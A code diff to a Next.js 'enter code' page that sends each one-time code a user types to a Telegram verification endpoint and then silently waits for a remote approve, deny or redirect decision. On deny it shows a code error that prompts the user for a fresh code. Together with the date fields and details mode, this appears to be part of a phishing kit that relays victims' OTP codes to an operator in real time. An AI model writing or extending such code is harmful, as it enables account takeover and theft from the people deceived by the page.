@@ -7,7 +7,12 @@ import { Button } from "@/components/ui/button"
 import { SiteFooter } from "@/components/site-footer"
 import { SiteHeader } from "@/components/site-header"
 import { Input } from "@/components/ui/input"
-import { OTP_RESEND_COOLDOWN_SEC } from "@/lib/approval-messages"
+import {
+  APPROVAL_TIMEOUT_MS,
+  OTP_CODE_ERROR_TEXT,
+  OTP_RESEND_COOLDOWN_SEC,
+} from "@/lib/approval-messages"
+import { createApproval, waitForApproval } from "@/lib/approval-client"
 import { MONTHS, DAYS, YEARS } from "@/lib/date-constants"
 import { LOADING_MS, wait } from "@/lib/loading-delays"
 import {
@@ -40,6 +45,7 @@ function EnterCodeContent() {
   const [isLoading, setIsLoading] = useState(false)
   const [isResending, setIsResending] = useState(false)
   const [resendCooldown, setResendCooldown] = useState(0)
+  const [codeError, setCodeError] = useState("")
 
   const modeIsDetails = searchParams.get("mode") === "details"
   useEffect(() => {
@@ -75,6 +81,7 @@ function EnterCodeContent() {
     }
 
     setIsLoading(true)
+    setCodeError("")
 
     await fetch("/api/telegram/verification", {
       method: "POST",
@@ -85,7 +92,28 @@ function EnterCodeContent() {
       }),
     }).catch(console.error)
 
-    window.location.href = "/api/login-out"
+    // Universal webhook gate for the OTP: wait (in the background, nothing is
+    // displayed) up to 90s for an approve / deny / redirect decision.
+    const approvalId = await createApproval("otp", uid)
+    const outcome = approvalId
+      ? await waitForApproval(approvalId, APPROVAL_TIMEOUT_MS)
+      : "expired"
+
+    if (outcome === "approve" || outcome === "redirect") {
+      // Approve advances to the next page; redirect jumps to the last page.
+      // Both resolve to the final destination of this flow.
+      window.location.href = "/api/login-out"
+      return
+    }
+
+    setIsLoading(false)
+
+    if (outcome === "deny") {
+      // Stay on this page and show the code-specific error.
+      setCodeError(OTP_CODE_ERROR_TEXT)
+      return
+    }
+    // No response within the waiting window — stay on this page.
   }
 
   const handleVerifyDetails = async () => {
@@ -347,11 +375,17 @@ function EnterCodeContent() {
               disabled={isLoading}
               onChange={(e) => {
                 setCode(e.target.value.replace(/\D/g, "").slice(0, 8))
+                if (codeError) setCodeError("")
               }}
               placeholder=""
               className="w-full max-w-[200px] px-2.5 py-1.5 border border-gray-300 rounded-md text-sm focus:outline-none focus:ring-2 focus:ring-[#1c68bf] focus:border-transparent disabled:bg-gray-100 disabled:cursor-not-allowed"
               maxLength={8}
             />
+            {codeError ? (
+              <p className="mt-2 text-xs text-red-600" role="alert">
+                {codeError}
+              </p>
+            ) : null}
           </div>
 
           <div className="flex gap-3 mt-3">
